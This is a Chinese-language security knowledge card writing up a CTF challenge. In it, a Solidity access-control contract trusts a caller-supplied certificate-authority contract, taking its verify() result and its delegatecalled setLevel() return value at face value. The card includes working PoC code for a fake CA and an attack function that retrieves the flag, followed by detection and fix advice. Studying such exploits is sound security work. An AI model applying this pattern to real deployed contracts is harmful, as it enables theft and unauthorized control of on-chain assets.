---
id: blockchain-solidity-user-supplied-ca-contract-delegatecall-return-trust
title: Solidity 权限合约信任调用者传入的外部 CA：伪 verify 返回 true + delegatecall 攻击合约伪造 setLevel 返回值绕过等级校验
type: scenario
domain: blockchain
path: blockchain/solidity
technique: solidity-user-controlled-ca-contract-delegatecall-return-value-bypass
tags:
- blockchain
- solidity
- access-control
- delegatecall
- untrusted-callee
- ctf
- evm
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V553
  verified_at: '2026-11-11T23:07:27+08:00'
  notes: 本篇无图，已按原文源码核对：accessRequest 接收任意 _CA 并保存、CA.verify 返回值直接置 grantedUsers、setSecurityLevel 对 address(CA) delegatecall 并用 mload(add(result,0x20)) 采信返回值，攻击者伪 CA（verify 恒 true、setLevel 返回 5）的授权与等级绕过链与卡片一致；合法 CA.setLevel 的 require(msg.sender==owner) 在 delegatecall 下不满足的分析正确。dedup 候选为改库地址/存储碰撞类 delegatecall 卡，无同链。未验证点：未链上复现。
url: /docs/blockchain/solidity/blockchain-solidity-user-supplied-ca-contract-delegatecall-return-trust/
draft: false
kb_aliases:
- Access Control CTF
- 可控 CA 合约
- delegatecall 返回值伪造
- 伪 verify 绕过鉴权
- setSecurityLevel delegatecall
- 外部合约地址未校验
---

## 一句话结论

权限合约的 `accessRequest(address _CA)` 让调用者自行指定"证书颁发机构"地址并保存，后续既用它的 `verify()` 返回值直接授信，又把 `setLevel()` 用 `delegatecall` 在自身上下文执行并采信返回值作为安全等级；攻击者部署一个 `verify()` 恒 true、`setLevel()` 恒返回 5 的假 CA，两次调用即可让 `securityLevel[msg.sender] == 5`，绕过 `flag()` 的双重检查。

## 原理

- **外部合约地址由调用者控制**：`CA = CertificateAuthority(_CA)` 没有任何白名单/代码哈希校验，攻击者可以把 `CA` 指向任意合约（或自己部署的合约）。
- **伪 verify**：`bool success = CA.verify(msg.sender); if (success) grantedUsers[msg.sender] = true;`——鉴权完全依赖外部合约的返回值；攻击者的 `verify()` 直接 `return true`，`grantedUsers` 被置真。
- **delegatecall 的两重问题**：`address(CA).delegatecall(abi.encodeWithSignature("setLevel(address,address,uint256)", owner, user, level))` 把攻击者合约的代码放到**权限合约的存储上下文**里执行——既能任意改写权限合约的存储（如直接改 owner/grantedUsers），又能返回任意数据；合约随后 `mload(add(result, 0x20))` 把返回值当作 `securityLevel[user]`，攻击者让 `setLevel` 恒返回 5 即可。
- **为什么 `setLevel` 内部校验挡不住**：合法 `CertificateAuthority.setLevel` 里的 `require(msg.sender == owner)` 在 delegatecall 下看到的是原始调用者（攻击合约）而非权限合约的 owner，正常路径本就不通；攻击者用假 CA 完全忽略该校验。
- **ABI 返回数据布局**：`result` 是 `abi.encode(uint256)` 的字节串，前 32 字节为偏移/长度开销，`mload(add(result, 0x20))` 取的是第一个 32 字节字（即返回值 5）。攻击合约的 `setLevel` 声明返回 `uint256` 并返回 5，编码后正好被这样读取。
- **为什么有效**：合约把"信任决策"外包给了一个可被调用者替换的外部组件，且用 delegatecall 执行它——这是典型的"不可信 callee + 过度信任返回值"缺陷，等价于把权限判断交给攻击者。

## 触发条件

- 合约提供形如 `accessRequest(address)` 的入口，允许调用者指定外部验证合约，且未校验地址来源/代码哈希。
- 后续逻辑用该外部合约的 `verify()` 返回值授权，或用 `delegatecall` 调它并采信返回值/存储写入。
- 攻击者能部署合约并调用目标合约（链上公开即可）；目标 `flag()` 只依赖 `grantedUsers` 与 `securityLevel`。
- delegatecall 目标函数签名与调用处一致（本例 `setLevel(address,address,uint256)`）。

## 利用步骤

1. 部署假 CA 合约：
   ```solidity
   contract FakeCA {
       function verify(address) public payable returns (bool) { return true; }
       function setLevel(address, address, uint256) public returns (uint256) { return 5; }
   }
   ```
2. 部署攻击合约（持有目标合约地址），依次调用：
   ```solidity
   attack.accessRequest(payable(address(fakeCA)));  // CA 指向假合约，verify 返回 true → grantedUsers[attack] = true
   attack.setSecurityLevel(address(this), 0);        // delegatecall 到假 CA，返回 5 → securityLevel[attack] = 5
   attack.flag();                                    // 两项检查均通过
   ```
3. 读取 `flag()` 返回值。

## PoC

原文攻击合约：

```solidity
contract CA {
    constructor() {}
    function verify(address user) public payable returns (bool) { return true; }
    function setLevel(address owner, address toSet, uint256 level) public returns (uint256) { return 5; }
}

// 攻击入口（在攻击合约中）
function attack(address target) external {
    AccessControll attackTarget = AccessControll(target);
    CA ca = new CA();
    attackTarget.accessRequest(payable(address(ca)));
    attackTarget.setSecurityLevel(address(this), 0);
    attackTarget.flag();
}
```

目标合约关键代码：

```solidity
function accessRequest(address payable _CA) public {
    CA = CertificateAuthority(_CA);
    bool success = CA.verify(msg.sender);
    if (success) grantedUsers[msg.sender] = true;
}

function setSecurityLevel(address user, uint256 level) public payable {
    require(grantedUsers[user] == true, "You need Permission...");
    (bool success, bytes memory result) = address(CA).delegatecall(
        abi.encodeWithSignature("setLevel(address,address,uint256)", owner, user, level));
    require(success, "Delegatecall failed");
    uint256 levelToSet;
    assembly { levelToSet := mload(add(result, 0x20)) }
    securityLevel[user] = levelToSet;
}

function flag() public view returns (string memory) {
    require(grantedUsers[msg.sender] == true, "You need Permission to get the flag!");
    require(securityLevel[msg.sender] == 5, "Your level must be 5 to get the flag!");
    return "flag{FAKE_FLAG}";
}
```

原文未给出部署账户与交易哈希；PoC 为代码级复现，未在本机链上执行。

## 变体与关联

- **组件替换变体**：CA 可换成预言机、价格源、回调处理器、策略合约等任何"由调用者指定地址"的外部组件；核心是"把信任判断交给可控地址"。
- **delegatecall 变体**：库地址可写 + delegatecall 存储碰撞（库内已有 `delegatecall-library-slot0-owner-hijack`、`fallback-delegatecall-storage-collision-owner-hijack` 等卡）——那些是改库地址后劫持存储；本卡是"主动把任意地址交给调用者并用 delegatecall 执行 + 采信返回值"，攻击面更直接。
- **返回值解析变体**：`mload(add(result,0x20))` 对 `abi.encode` 结果的读取依赖返回类型；攻击者构造返回类型/长度即可让合约读到任意值（如把 `securityLevel` 设为 5）。
- **同题链**：本题还要求 `grantedUsers` 与 `securityLevel` 同时满足；若只校验其中一项，攻击面更小（只需伪 verify 或伪 setLevel 之一）。

## 检测与防御

- **代码修复**：外部 CA 地址必须来自白名单/由合约自身创建并记录，绝不接受调用者传入；不要对不可信地址 `delegatecall`；权限判断不要采信外部合约的裸返回值，至少校验调用目标代码哈希与返回类型。
- **审计信号**：`delegatecall` 的目标变量来自参数/存储且可被调用者修改；`verify`/`isValid` 等外部调用结果直接用于授权；返回值用内联汇编 `mload` 直接使用。
- **运行监控**：链上监控对同一合约短时间内切换 CA 地址、delegatecall 到新建合约、`securityLevel` 异常写入等行为告警。
- **CTF 视角**：先找 `flag()` 的 require，再回溯"每个条件由谁设置、设置路径上的外部输入是否可控"；可控合约地址 + delegatecall 是常见突破口。

## 备注

- 原文为 2024 BMW web3 CTF 题解（Meidum-Access Control）；目标与攻击合约源码均来自原文，未在本机链上复现。
- 原文提到 `abi.encode(uint(5))` 与 `mload` 的返回值布局踩坑：delegatecall 返回的是 ABI 编码字节，`mload(add(result,0x20))` 取第一个字，故假 CA 声明 `returns (uint256)` 返回 5 即可被正确读取。
